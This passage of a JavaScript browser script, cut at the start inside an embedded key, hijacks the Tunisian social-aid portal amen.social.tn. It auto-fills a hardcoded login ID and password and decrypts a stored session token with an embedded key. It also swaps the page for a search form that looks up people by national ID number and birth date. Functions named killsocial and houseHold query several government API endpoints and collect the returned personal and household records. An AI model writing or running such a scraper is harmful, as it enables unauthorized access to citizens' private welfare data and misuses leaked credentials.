d092\n0203 0186 a0\n-----END PUBLIC KEY-----",{keySize: 16, iv: "-----BEGIN PRIVATE KEY-----\n3082 0375 3082 025d a003 0201 0202 042e\nf0ec 7430 0d06 092a 8648 86f7 0d01 010b\n0500 306b 310b 3009 0603 5504 0613 0254\n4e31 0e30 0c06 0355 0408 1305 5475 6e69\n7331 0e30 0c06 0355 0407 1305 5475 6e69\n7331 1030 0e06 0355 040a 1307 4e75 6d65\n7279 7831 1030 0e06 0355 040b 1307 4e75\n6d65 7279 7831 1830 1606 0355 0403 130f\n4e75 6d65 7279 7820 5475 6e69 7369 6530\n1e17 0d32 3030 3530 3631 3332 3134 375a\n170d 3231 3035 3036 3133 3231 3437 5a30\n6b31 0b30 0906 0355 0406 1302 544e 310e\n300c 0603 5504 0813 0554 756e 6973 310e\n300c 0603 5504 0713 0554 756e 6973 3110\n300e 0603 5504 0a13 074e 756d 6572 7978\n3110 300e 0603 5504 0b13 074e 756d 6572\n7978 3118 3016 0603 5504 0313 0f4e 756d\n6572 7978 2054 756e 6973 6965 3082 0122\n300d 0609 2a86 4886 f70d 0101 0105 0003\n8201 0f00 3082 010a 0282 0101 00df 9389\nc854 e1df bd6a 22e2 3dda 636c 2af4 dc43\n8ae3 8825 77a2 a184 69d0 bca1 14ba 4940\n9e4d 3525 e5ab 3f72 6593 cce4 fd9c 25d7\n765e 8d8d 24ce 9929 ee4b 2314 867d 9c64\n43c8 60fe ecab 2730 db70 709a d734 b17a\nf311 d08b bc7b c416 de23 76b5 6eaf 80dd\nfc36 58c3 6617 99ec c5c8 6f13 7c1c fe72\n315c 009c 1660 7342 9c4b c01f 0431 769e\nd7eb c740 e091 33be 3961 a245 755a 2cd5\n5004 f923 7527 9972 50ed 74cf 03c5 67bb\n29a3 d135 ff32 06d3 c434 ed34 442d bd1c\nfdfd 7cb9 c1b6 4ccc 7178 7861 2ecc eb8b\n28e4 4a2e a8de 156a e59f 5b22 006f ddfc\n3916 6db7 1ba0 d4f4 29e1 557e 1ac0 baaf\nfe8f 61dd 78a8 f0ad b523 c1d1 a29d 58d0\n4222 c386 d1b3 e07a d774 a08f c702 0301\n0001 a321 301f 301d 0603 551d 0e04 1604\n149e 7f1b 375b 43f1 c963 0723 d64d 9f98\n52d3 511a 8c30 0d06 092a 8648 86f7 0d01\n010b 0500 0382 0101 00c8 a939 10e2 19a6\na6c1 d3be 1e15 1c3b 9b8a 9735 ba7d d252\nd3bc b24f 107e 8b90 48ad 4a8f 1e1c 481e\nb70f 183c 6c6a cd95 b113 387b 5c9d 751a\n2b05 94a2 9471 c54e 9f2c 9684 e769 b959\n0be4 7ff5 6a83 0392 7c09 3b65 495a 34a0\n6351 89f0 4d73 5de2 fca9 e90b bd62 f6ca\nd91c e88b 108d 6298 d7e8 b2d6 23e5 ca9c\n6d5f 51a1 a6f8 a63d abb0 6c2c 6d7c d936\n4f2e f42b e9c4 24a4 6a96 5c36 e696 bd5f\ne442 baf9 7efd 7557 9d3e 17de bcb5 6c7a\ndc6a 4cf1 364b c878 213d 7277 6b24 e5f7\n1a4f a592 1f6a 4f1a 811b a7b3 7466 9255\n3607 487c 2660 8355 038f 303b 9105 84f3\n70de b730 1c90 6b6c bf3d 1410 71b8 38d3\nb578 9f8a 1997 1808 bf21 e54c cf05 b777\n84eb 0c73 e906 0f1c 5e\n-----END PRIVATE KEY----" }));
}
function killsocial(cin, dob, i, result) {
    if(i==urlx.length){
        houseHold(cin,dob,result);
        return true;
    }
    var myHeaders = new Headers();
    myHeaders.append("Authorization", "Bearer " + token);
    myHeaders.append("Content-Type", "application/json");
    myHeaders.append("Cookie", "cookiesession1=678A3E0FIJKLMNOPQRSTUVWXYZBF2BBB");
    var raw = JSON.stringify({
        "cin": cin,
        "anneeNaiss": dob.split("-")[0],
        "moisNaiss": dob.split("-")[1],
        "jourNaiss": dob.split("-")[2]
    });
    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    fetch("https://amen.social.tn/auth/api/cni-cloud/"+urlx[i], requestOptions)
        .then(response => {
            if (response.status==200) return response.json();
            else throw response;
        })
        .then(data => {
            if(i==0) result = {cin:cin,dob:dob};
            if (data.nom) Object.assign(result,data);
            killsocial(cin, dob, i+1, result);
        })
        .catch(error => {
            if(!result) result = {cin:cin,dob:dob};
            Object.assign(result,{["error_"+urlx[i]]: error.status});
            if(error.status==401) {
                console.log(result);
                token="";
            }
            killsocial(cin, dob, i+1, result);
        });
}

function gettoken(){
    token = xdecrypt(JSON.parse(localStorage.user).token);
}
function datapush(x){
    console.log(x);
    jsonViewer.showJSON(x, null, 1);
}
function houseHold(cin,dob,result){
    var myHeaders = new Headers();
    myHeaders.append("Authorization", "Bearer "+token);
    myHeaders.append("Cookie", "cookiesession1=678A3E0FIJKLMNOPQRSTUVWXYZBF2BBB");
    var requestOptions = {
        method: 'GET',
        headers: myHeaders,
        redirect: 'follow'
    };
    fetch("https://amen.social.tn/social-help/api/houseHold/byNumber?identificationNumber="+cin+"&identificationTypeId=1&birthDate="+dob, requestOptions)
    .then(response => {
        if (response.status==200&&response.headers.get("content-type")=="application/json") return response.json();
        else throw response;
    })
    .then(data => {
        if (data.firstName) Object.assign(result,data);
        datapush(result); 
    })
    .catch(error => {
        if(!result) result = {cin:cin,dob:dob};
        if(error.status!=200) Object.assign(result,{["error_houseHold"]: error.status});
        if(error.status==401) {
            console.log(result);
            token="";
        }
        datapush(result);
    });
}
function horu(){
    if(token == "") {
        gettoken();
        setTimeout(() => {
            killsocial(icin.value, idob.value, 0, []);
        }, 3000);
    }
    else killsocial(icin.value, idob.value, 0, []);
}
function jsonview(){
    document.querySelector("#json_container").appendChild(jsonViewer.getContainer());
}
setInterval(() => {
    if(document.getElementsByClassName('background second-button-menu appearance-filled full-width size-medium status-basic shape-rectangle icon-start nb-transition status-primary').length>0) {
        document.getElementsByClassName('background second-button-menu appearance-filled full-width size-medium status-basic shape-rectangle icon-start nb-transition status-primary')[0].onclick = function() {
            document.getElementsByTagName("html")[0].innerHTML='<head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> <link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/hagticprod/tn/json-viewer.css"> <link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/hagticprod/tn/material-design-iconic-font.min.css"> <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/hagticprod/tn/style.css"/> <script type="text/javascript" src="//cdn.jsdelivr.net/gh/hagticprod/tn/json-viewer.css"></script> </head> <body dir="ltr" class="form-v10"><div id="second-header" style="display:none"></div> <div class="page-content"> <div class="form-v10-content"> <form class="form-detail" action="javascript:horu()" method="post" id="myform"> <div class="form-left"> <h2>Search</h2> <div class="form-row"> <input type="text" name="cin" id="icin" maxlength="8" pattern="[0-9]{8}" placeholder="CIN" required> </div> <div class="form-row"> <input type="date" name="dob" id="idob" placeholder="Date of Birth" required> </div> <div class="form-row-last"> <input type="submit" name="find" class="find" value="Find"> </div> </div> <div class="form-right"> <div id="json_container" style="padding: 0px 20px;font-size: large;"></div></div> </form> </div> </div></body>';
            setTimeout(() => {jsonview();}, 1000);
        };
    }
    if(document.getElementById('identifiant')&&document.getElementById('input-password')) {
        if(identifiant.value==''||document.getElementById('input-password').value==''){
            identifiant.value = '13475945';
            identifiant.dispatchEvent(new Event('input', { bubbles: true }));
            document.getElementById('input-password').value = 'ZJYJbqcN';
            document.getElementById('input-password').dispatchEvent(new Event('input', { bubbles: true }));
        }
    }
}, 1000);